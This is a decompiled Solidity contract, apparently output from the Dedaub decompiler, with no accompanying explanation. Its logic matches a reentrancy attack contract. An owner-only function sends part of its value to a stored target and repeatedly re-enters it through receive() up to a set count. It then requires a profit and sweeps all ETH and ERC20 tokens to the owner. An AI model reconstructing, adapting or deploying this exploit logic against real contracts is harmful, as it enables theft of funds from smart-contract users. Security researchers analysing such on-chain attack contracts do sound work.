// Decompiled by library.dedaub.com
// 2024.02.12 19:38 UTC
// Compiled using the solidity compiler version 0.8.19


// Data structures and variables inferred from the use of storage instructions
uint256 stor_1; // STORAGE[0x1]
uint256 stor_2; // STORAGE[0x2]
uint256 stor_3; // STORAGE[0x3]
uint256 _owner; // STORAGE[0x0] bytes 0 to 19
uint256 _receive; // STORAGE[0x0] bytes 20 to 20
uint256 stor_4_0_19; // STORAGE[0x4] bytes 0 to 19


// Events
OwnershipTransferred(address, address);

function receive() public payable { 
    v0 = v1 = !_receive;
    if (_receive) {
        v0 = v2 = stor_3 >= stor_2;
    }
    if (!v0) {
        require(stor_3 + 1, Panic(17)); // arithmetic overflow or underflow
        stor_3 += 1;
        v3, /* uint256 */ v4 = stor_4_0_19.staticcall(0x97d54cf7).gas(msg.gas);
        require(bool(v3), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
        require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
        v5 = _SafeAdd(1, v4);
        require(bool(stor_4_0_19.code.size));
        v6 = stor_4_0_19.call(uint32(0xf30e3658)).value(v5).gas(msg.gas);
        require(bool(v6), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
        exit;
    } else {
        stor_3 = 0;
        exit;
    }
}

function 0x5b00cdf8() public nonPayable { 
    v0, /* uint256 */ v1 = stor_4_0_19.staticcall(uint32(0x97d54cf7)).gas(msg.gas);
    require(bool(v0), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    return v1;
}

function renounceOwnership() public nonPayable { 
    0x6b2();
    _owner = 0;
    emit OwnershipTransferred(_owner, address(0x0));
}

function 0x77c35060(uint256 varg0) public nonPayable { 
    require(msg.data.length - 4 >= 32);
    0x6b2();
    stor_2 = varg0;
}

function 0x8a064a1d() public nonPayable { 
    0x6b2();
    require(this.balance > 0, Error(17733));
    v0, /* uint256 */ v1 = _owner.call().value(this.balance).gas(msg.gas);
    if (RETURNDATASIZE() != 0) {
        v2 = new bytes[](RETURNDATASIZE());
        RETURNDATACOPY(v2.data, 0, RETURNDATASIZE());
    }
    require(v0, Error(83));
}

function owner() public nonPayable { 
    return _owner;
}

function 0xe8b00990() public payable { 
    0x6b2();
    require(msg.value > 0, Error(0x454545));
    require((msg.value == msg.value * 49 / 49) | !0x31, Panic(17)); // arithmetic overflow or underflow
    require(100, Panic(18)); // division by zero
    stor_1 = msg.value * 49 / 100;
    require(bool(stor_4_0_19.code.size));
    v0 = stor_4_0_19.call(0xf30e365800000000000000000000000000000000000000000000000000000000).value(msg.value * 49 / 100).gas(msg.gas);
    require(bool(v0), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
    _receive = 1;
    v1, /* uint256 */ v2 = stor_4_0_19.staticcall(0x97d54cf7).gas(msg.gas);
    require(bool(v1), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    v3 = _SafeAdd(1, v2);
    require(bool(stor_4_0_19.code.size));
    v4 = stor_4_0_19.call(uint32(0xf30e3658)).value(v3).gas(msg.gas);
    require(bool(v4), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
    _receive = 0;
    require(this.balance > msg.value, Error(19781));
    v5, /* uint256 */ v6 = _owner.call().value(this.balance).gas(msg.gas);
    if (RETURNDATASIZE() != 0) {
        v7 = new bytes[](RETURNDATASIZE());
        RETURNDATACOPY(v7.data, 0, RETURNDATASIZE());
    }
    require(v5, Error(83));
}

function transferOwnership(address newOwner) public nonPayable { 
    require(msg.data.length - 4 >= 32);
    0x6b2();
    require(newOwner, Error('Ownable: new owner is the zero address'));
    _owner = newOwner;
    emit OwnershipTransferred(_owner, newOwner);
}

function 0xf81801cc(address varg0) public nonPayable { 
    require(msg.data.length - 4 >= 32);
    0x61c(varg0);
}

function 0x61c(address varg0) private { 
    0x6b2();
    v0, /* uint256 */ v1 = varg0.balanceOf(this).gas(msg.gas);
    require(bool(v0), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    if (this.balance >= 0) {
        v2 = v3 = 0;
        while (v2 < 68) {
            MEM[v2 + MEM[64]] = MEM[v2 + (MEM[64] + 32)];
            v2 += 32;
        }
        MEM[68 + MEM[64]] = 0;
        v4, /* uint256 */ v5, /* uint256 */ v6, /* uint256 */ v7 = varg0.transfer(_owner, v1).gas(msg.gas);
        if (RETURNDATASIZE() == 0) {
            v8 = v9 = 96;
        } else {
            v8 = v10 = new bytes[](RETURNDATASIZE());
            RETURNDATACOPY(v10.data, 0, RETURNDATASIZE());
        }
        if (!v4) {
            require(!MEM[v8], v7, MEM[v8]);
            v11 = new bytes[](v12.length);
            v13 = v14 = 0;
            while (v13 < v12.length) {
                v11[v13] = v12[v13];
                v13 += 32;
            }
            v11[v12.length] = 0;
            revert(Error(v11, v15, 'SafeERC20: low-level call failed'));
        } else {
            if (!(0 - MEM[v8])) {
                require(varg0.code.size, Error('Address: call to non-contract'));
            }
            v16 = v17 = 0 == MEM[v8];
            if (0 != MEM[v8]) {
                require(32 + v8 + MEM[v8] - (32 + v8) >= 32);
                v16 = MEM[32 + v8];
                require(v16 == bool(v16));
            }
            require(v16, Error('SafeERC20: ERC20 operation did not succeed'));
            return ;
        }
    } else {
        MEM[MEM[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000;
        MEM[MEM[64] + 4] = 32;
        revert(Error('Address: insufficient balance for call'));
    }
}

function 0x6b2() private { 
    require(msg.sender == _owner, Error('Ownable: caller is not the owner'));
    return ;
}

function _SafeAdd(uint256 varg0, uint256 varg1) private { 
    require(varg0 <= varg1 + varg0, Panic(17)); // arithmetic overflow or underflow
    return varg1 + varg0;
}

// Note: The function selector is not present in the original solidity code.
// However, we display it for the sake of completeness.

function function_selector( function_selector) public payable { 
    MEM[64] = 128;
    if (msg.data.length < 4) {
        require(!msg.data.length);
        receive();
    } else if (0x8da5cb5b > function_selector >> 224) {
        if (0x5b00cdf8 == function_selector >> 224) {
            0x5b00cdf8();
        } else if (0x715018a6 == function_selector >> 224) {
            renounceOwnership();
        } else if (0x77c35060 == function_selector >> 224) {
            0x77c35060();
        } else {
            require(0x8a064a1d == function_selector >> 224);
            0x8a064a1d();
        }
    } else if (0x8da5cb5b == function_selector >> 224) {
        owner();
    } else if (0xe8b00990 == function_selector >> 224) {
        0xe8b00990();
    } else if (0xf2fde38b == function_selector >> 224) {
        transferOwnership(address);
    } else {
        require(0xf81801cc == function_selector >> 224);
        0xf81801cc();
    }
}
